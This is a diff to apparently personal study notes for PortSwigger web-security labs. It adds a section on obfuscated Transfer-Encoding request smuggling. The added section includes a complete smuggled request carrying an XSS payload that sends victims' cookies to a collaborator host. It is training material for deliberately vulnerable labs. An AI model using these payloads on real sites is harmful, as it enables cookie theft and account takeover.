@@ -210,7 +210,7 @@ Transfer-Encoding: chunked
 0
 
 GET /post?postId=4 HTTP/1.1
-User-Agent: a"/><script>document.location='http://j0kk3reuzdhg8gslbbcrqwdtnktbh15q.oastify.com/?Hack='+document.cookie;</script>
+User-Agent: a"/><script>document.location='http://COLLABORATOR.oastify.com/?Hack='+document.cookie;</script>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 5
 
@@ -225,7 +225,35 @@ x=1
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  
 
+### Dualchunk TE  
+
 >If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  
+
+<sub>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way. Ways to obfuscate the Transfer-Encoding header. For example:</sub>  
+
+```html
+POST / HTTP/1.1
+Host: TARGET.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 245
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GET /post?postId=4 HTTP/1.1
+User-Agent: a"/><script>document.location='http://COLLABORATOR.oastify.com/?Hack='+document.cookie;</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0  
+  
+```  
+
+>**Note:** You need to include the trailing sequence \r\n\r\n following the final 0.  
+
+[PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  
+
 
 ## PrivEsc JSON RoleId
 
